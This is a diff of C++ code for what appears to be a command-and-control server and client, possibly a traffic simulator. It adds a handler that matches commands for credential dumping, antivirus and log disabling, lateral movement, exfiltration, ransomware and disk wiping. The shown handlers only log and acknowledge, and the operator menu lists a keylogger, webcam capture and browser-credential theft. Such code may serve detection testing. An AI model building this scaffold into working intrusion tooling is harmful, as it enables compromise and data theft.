+                            std::cout << "[INFO] Setting startup folder persistence..." << std::endl;
+                            response = "STARTUP:PERSISTENCE_SET:" + clientId;
+                        }
+                        else if (receivedData.find("BOOTKIT_INSTALLATION") != std::string::npos) {
+                            std::cout << "[INFO] Installing bootkit..." << std::endl;
+                            response = "BOOTKIT:INSTALLED:" + clientId;
+                        }
+                        
+                        // LATERAL MOVEMENT
+                        else if (receivedData.find("NETWORK_PORT_SCANNING") != std::string::npos) {
+                            std::cout << "[INFO] Scanning network ports..." << std::endl;
+                            response = "PORTS:SCANNED:" + clientId;
+                        }
+                        else if (receivedData.find("SMB_SHARE_ENUMERATION") != std::string::npos) {
+                            std::cout << "[INFO] Enumerating SMB shares..." << std::endl;
+                            response = "SMB:ENUMERATED:" + clientId;
+                        }
+                        else if (receivedData.find("PSEXEC_LATERAL_MOVEMENT") != std::string::npos) {
+                            std::cout << "[INFO] Executing PsExec lateral movement..." << std::endl;
+                            response = "PSEXEC:EXECUTED:" + clientId;
+                        }
+                        else if (receivedData.find("WMI_REMOTE_EXECUTION") != std::string::npos) {
+                            std::cout << "[INFO] Executing WMI remote commands..." << std::endl;
+                            response = "WMI:EXECUTED:" + clientId;
+                        }
+                        else if (receivedData.find("RDP_LATERAL_MOVEMENT") != std::string::npos) {
+                            std::cout << "[INFO] Moving laterally via RDP..." << std::endl;
+                            response = "RDP:LATERAL_SUCCESS:" + clientId;
+                        }
+                        else if (receivedData.find("PASS_THE_HASH_ATTACK") != std::string::npos) {
+                            std::cout << "[INFO] Executing pass-the-hash attack..." << std::endl;
+                            response = "PTH:EXECUTED:" + clientId;
+                        }
+                        else if (receivedData.find("MIMIKATZ_CREDENTIAL_DUMP") != std::string::npos) {
+                            std::cout << "[INFO] Dumping credentials with Mimikatz..." << std::endl;
+                            response = "MIMIKATZ:CREDENTIALS_DUMPED:" + clientId;
+                        }
+                        
+                        // PRIVILEGE ESCALATION
+                        else if (receivedData.find("UAC_BYPASS_EXPLOITATION") != std::string::npos) {
+                            std::cout << "[INFO] Bypassing UAC..." << std::endl;
+                            response = "UAC:BYPASSED:" + clientId;
+                        }
+                        else if (receivedData.find("ACCESS_TOKEN_THEFT") != std::string::npos) {
+                            std::cout << "[INFO] Stealing access token..." << std::endl;
+                            response = "TOKEN:STOLEN:" + clientId;
+                        }
+                        else if (receivedData.find("PRIVILEGE_ESCALATION_ENUMERATION") != std::string::npos) {
+                            std::cout << "[INFO] Enumerating privilege escalation..." << std::endl;
+                            response = "PRIVESC:ENUMERATED:" + clientId;
+                        }
+                        else if (receivedData.find("LSASS_MEMORY_DUMP") != std::string::npos) {
+                            std::cout << "[INFO] Dumping LSASS memory..." << std::endl;
+                            response = "LSASS:DUMPED:" + clientId;
+                        }
+                        else if (receivedData.find("SAM_DATABASE_EXTRACTION") != std::string::npos) {
+                            std::cout << "[INFO] Extracting SAM database..." << std::endl;
+                            response = "SAM:EXTRACTED:" + clientId;
+                        }
+                        
+                        // DEFENSE EVASION
+                        else if (receivedData.find("ANTIVIRUS_DISABLING") != std::string::npos) {
+                            std::cout << "[INFO] Disabling antivirus..." << std::endl;
+                            response = "ANTIVIRUS:DISABLED:" + clientId;
+                        }
+                        else if (receivedData.find("EVENT_LOG_CLEARING") != std::string::npos) {
+                            std::cout << "[INFO] Clearing event logs..." << std::endl;
+                            response = "LOGS:CLEARED:" + clientId;
+                        }
+                        else if (receivedData.find("FILE_TIMESTAMP_MANIPULATION") != std::string::npos) {
+                            std::cout << "[INFO] Manipulating file timestamps..." << std::endl;
+                            response = "TIMESTOMP:EXECUTED:" + clientId;
+                        }
+                        else if (receivedData.find("PROCESS_HOLLOWING_INJECTION") != std::string::npos) {
+                            std::cout << "[INFO] Executing process hollowing..." << std::endl;
+                            response = "HOLLOW:EXECUTED:" + clientId;
+                        }
+                        else if (receivedData.find("ROOTKIT_INSTALLATION") != std::string::npos) {
+                            std::cout << "[INFO] Installing rootkit..." << std::endl;
+                            response = "ROOTKIT:INSTALLED:" + clientId;
+                        }
+                        else if (receivedData.find("AMSI_BYPASS_TECHNIQUE") != std::string::npos) {
+                            std::cout << "[INFO] Bypassing AMSI..." << std::endl;
+                            response = "AMSI:BYPASSED:" + clientId;
+                        }
+                        else if (receivedData.find("ETW_LOGGING_DISABLING") != std::string::npos) {
+                            std::cout << "[INFO] Disabling ETW logging..." << std::endl;
+                            response = "ETW:DISABLED:" + clientId;
+                        }
+                        
+                        // EXFILTRATION
+                        else if (receivedData.find("DATA_STAGING_FOR_EXFILTRATION") != std::string::npos) {
+                            std::cout << "[INFO] Staging data for exfiltration..." << std::endl;
+                            response = "DATA:STAGED:" + clientId;
+                        }
+                        else if (receivedData.find("DATA_COMPRESSION") != std::string::npos) {
+                            std::cout << "[INFO] Compressing data..." << std::endl;
+                            response = "DATA:COMPRESSED:" + clientId;
+                        }
+                        else if (receivedData.find("HTTP_DATA_EXFILTRATION") != std::string::npos) {
+                            std::cout << "[INFO] Exfiltrating data via HTTP..." << std::endl;
+                            response = "EXFIL:HTTP_COMPLETE:" + clientId;
+                        }
+                        else if (receivedData.find("DNS_TUNNEL_EXFILTRATION") != std::string::npos) {
+                            std::cout << "[INFO] Exfiltrating data via DNS..." << std::endl;
+                            response = "EXFIL:DNS_COMPLETE:" + clientId;
+                        }
+                        else if (receivedData.find("ICMP_TUNNEL_EXFILTRATION") != std::string::npos) {
+                            std::cout << "[INFO] Exfiltrating data via ICMP..." << std::endl;
+                            response = "EXFIL:ICMP_COMPLETE:" + clientId;
+                        }
+                        else if (receivedData.find("EMAIL_DATA_EXFILTRATION") != std::string::npos) {
+                            std::cout << "[INFO] Exfiltrating data via email..." << std::endl;
+                            response = "EXFIL:EMAIL_COMPLETE:" + clientId;
+                        }
+                        else if (receivedData.find("CLOUD_SERVICE_UPLOAD") != std::string::npos) {
+                            std::cout << "[INFO] Uploading to cloud service..." << std::endl;
+                            response = "CLOUD:UPLOADED:" + clientId;
+                        }
+                        
+                        // IMPACT
+                        else if (receivedData.find("RANSOMWARE_DEPLOYMENT") != std::string::npos) {
+                            std::cout << "[INFO] Deploying ransomware..." << std::endl;
+                            response = "RANSOMWARE:DEPLOYED:" + clientId;
+                        }
+                        else if (receivedData.find("DISK_WIPING_ATTACK") != std::string::npos) {
+                            std::cout << "[INFO] Wiping disk..." << std::endl;
+                            response = "DISK:WIPED:" + clientId;
+                        }
+                        else if (receivedData.find("BOOT_SECTOR_CORRUPTION") != std::string::npos) {
+                            std::cout << "[INFO] Corrupting boot sector..." << std::endl;
+                            response = "BOOT:CORRUPTED:" + clientId;
+                        }
+                        else if (receivedData.find("CRYPTOCURRENCY_MINING") != std::string::npos) {
+                            std::cout << "[INFO] Starting cryptocurrency mining..." << std::endl;
+                            response = "MINER:STARTED:" + clientId;
+                        }
+                        
+                        // COMMAND & CONTROL
+                        else if (receivedData.find("TOR_NETWORK_CONNECTION") != std::string::npos) {
+                            std::cout << "[INFO] Connecting to TOR network..." << std::endl;
+                            response = "TOR:CONNECTED:" + clientId;
+                        }
+                        else if (receivedData.find("TOR_API_COMMUNICATION") != std::string::npos) {
+                            std::cout << "[INFO] Communicating via TOR API..." << std::endl;
+                            response = "TOR_API:EXECUTED:" + clientId;
+                        }
+                        else if (receivedData.find("REVERSE_SSH_TUNNEL") != std::string::npos) {
+                            std::cout << "[INFO] Creating reverse SSH tunnel..." << std::endl;
+                            response = "SSH:TUNNEL_CREATED:" + clientId;
+                        }
+                        else if (receivedData.find("NETCAT_NETWORK_TUNNEL") != std::string::npos) {
+                            std::cout << "[INFO] Creating netcat tunnel..." << std::endl;
+                            response = "NETCAT:TUNNEL_CREATED:" + clientId;
+                        }
+                        else if (receivedData.find("SOCAT_NETWORK_RELAY") != std::string::npos) {
+                            std::cout << "[INFO] Creating socat relay..." << std::endl;
+                            response = "SOCAT:RELAY_CREATED:" + clientId;
+                        }
+                        else if (receivedData.find("CRYPTCAT_ENCRYPTED_TUNNEL") != std::string::npos) {
+                            std::cout << "[INFO] Creating cryptcat tunnel..." << std::endl;
+                            response = "CRYPTCAT:TUNNEL_CREATED:" + clientId;
+                        }
+                        
+                        // FALLBACK FOR ANY UNRECOGNIZED COMMANDS
+                        else {
+                            std::cout << "[INFO] Processing generic command: " << receivedData.substr(0, 50) << std::endl;
+                            response = "COMMAND:EXECUTED:" + clientId;
+                        }
+                        
+                        // Send the response
+                        if (!response.empty()) {
+                            send(clientSocket, response.c_str(), response.length(), 0);
+                        }
+                    }
+                }
+            } else if (bytesReceived == 0) {
+                std::cout << "[INFO] Server disconnected" << std::endl;
+                break;
+            } else {
+                int error = WSAGetLastError();
+                if (error == WSAEWOULDBLOCK) {
+                    // No data available, wait a short time and continue
+                    Sleep(100);
+                    continue;
+                } else {
+                    std::cout << "[ERROR] Receive failed: " << error << std::endl;
+                    break;
+                }
+            }
+        }
+        
+        std::cout << "[INFO] Client shutting down..." << std::endl;
+        closesocket(clientSocket);
+        WSACleanup();
+    }
 
     // Native C++ Web Server Implementation
     SOCKET webServerSocket = INVALID_SOCKET;
     std::atomic<bool> webServerRunning(false);
-    
-    // Function to handle HTTP requests
-    void handleHTTPClient(SOCKET clientSocket);
     
     // Function to start the C++ web server
     void startWebServer() {
@@ -2391,6 +3205,8 @@ std::atomic<bool> serverRunning(true);
         
         webThread.detach();
     }
+
+
     
     // Helper function to get current directory
     std::string GetCurrentDirectoryString() {
@@ -2784,12 +3600,26 @@ std::atomic<bool> serverRunning(true);
         closesocket(clientSocket);
     }
     
-    // Forward declarations for queue functions
-    void executeQueuedCommand(const std::string& targetClientId, const std::string& command);
-    void executeGlobalQueuedCommand(const std::string& command);
-    
     // Command queue monitor function
     void processCommandQueue() {
+        // FIRST: Process F-key commands from clientCommandQueue
+        {
+            std::lock_guard<std::mutex> lock(clientsMutex);
+            for (auto& [clientId, client] : connectedClients) {
+                if (client.isActive && !clientCommandQueue[clientId].empty()) {
+                    logActivity("C2", "PROCESSING_QUEUE", "Processing " + std::to_string(clientCommandQueue[clientId].size()) + " queued commands for " + clientId);
+                    
+                    for (auto cmd : clientCommandQueue[clientId]) {
+                        generateC2Traffic(client.socket, clientId, cmd);
+                        std::string cmdName = getCommandName(cmd);
+                        logActivity("C2", "COMMAND_SENT", "Sent " + cmdName + " to " + clientId);
+                    }
+                    clientCommandQueue[clientId].clear();
+                }
+            }
+        }
+        
+        // SECOND: Process web dashboard JSON commands
         std::string queueDir = "C:\\Windows\\Temp\\C2_CommandQueue";
         
         // Create directory if it doesn't exist
@@ -2884,8 +3714,7 @@ std::atomic<bool> serverRunning(true);
                 } else if (command == "SHELL") {
                     // Send shell command directly
                     std::string shellCmd = "SHELL:INIT\n";
-                    std::string encrypted = xorEncrypt(shellCmd);
-                    send(client.socket, encrypted.c_str(), encrypted.size(), 0);
+                    send(client.socket, shellCmd.c_str(), shellCmd.size(), 0);
                     logActivity("DEBUG", "SHELL_COMMAND", "Sent shell initialization");
                 } else if (command == "WEBCAM:CAPTURE") {
                     executeWebcamCapture(client.socket, clientId);
@@ -2900,14 +3729,12 @@ std::atomic<bool> serverRunning(true);
                 } else if (command == "KILL") {
                     // Send kill command directly
                     std::string killCmd = "TERMINATE\n";
-                    std::string encrypted = xorEncrypt(killCmd);
-                    send(client.socket, encrypted.c_str(), encrypted.size(), 0);
+                    send(client.socket, killCmd.c_str(), killCmd.size(), 0);
                     logActivity("DEBUG", "KILL_COMMAND", "Sent termination command");
                 } else {
                     // Send as generic text command
                     std::string textCmd = command + "\n";
-                    std::string encrypted = xorEncrypt(textCmd);
-                    send(client.socket, encrypted.c_str(), encrypted.size(), 0);
+                    send(client.socket, textCmd.c_str(), textCmd.size(), 0);
                     logActivity("DEBUG", "GENERIC_COMMAND", "Sent generic command: " + command);
                 }
                 
@@ -2956,6 +3783,9 @@ std::atomic<bool> serverRunning(true);
         CreateDirectoryA("C:\\temp\\logs", NULL);
 
         logActivity("C2", "INIT", "Advanced C2 Server initializing...");
+
+        // Initialize server job system
+        initializeServerJobSystem();
 
         // Initialize Winsock
         WSADATA wsaData;
@@ -3124,7 +3954,7 @@ std::atomic<bool> serverRunning(true);
         std::cout << "|                                                                            |\n";
         std::cout << "| ATTACK PHASES:                 SURVEILLANCE:            EVASION:           |\n";
         std::cout << "|   1 - Phase 1: Recon            S - Screenshot           A - Disable AV    |\n";
-        std::cout << "|   2 - Phase 2: Priv Esc         K - Start Keylogger      C - Clear Logs   |\n";
+        std::cout << "|   2 - Phase 2: Priv Esc         K - Start Keylogger      C - Clear All Logs   |\n";
         std::cout << "|   3 - Phase 3: Defense Evade    D - Dump Keylogs         T - TOR Connect  |\n";
         std::cout << "|   4 - Phase 4: Surveillance     W - Webcam Capture       N - SSH/Netcat/Socat/Cryptcat   |\n";
         std::cout << "|   5 - Phase 5: Discovery        B - Browser Creds                         |\n";
@@ -3586,6 +4416,9 @@ std::atomic<bool> serverRunning(true);
 
         // Cleanup
         logActivity("C2", "CLEANUP", "Shutting down C2 infrastructure");
+        
+        // Shutdown server job system
+        shutdownServerJobSystem();
 
         closesocket(listenSocket);
 
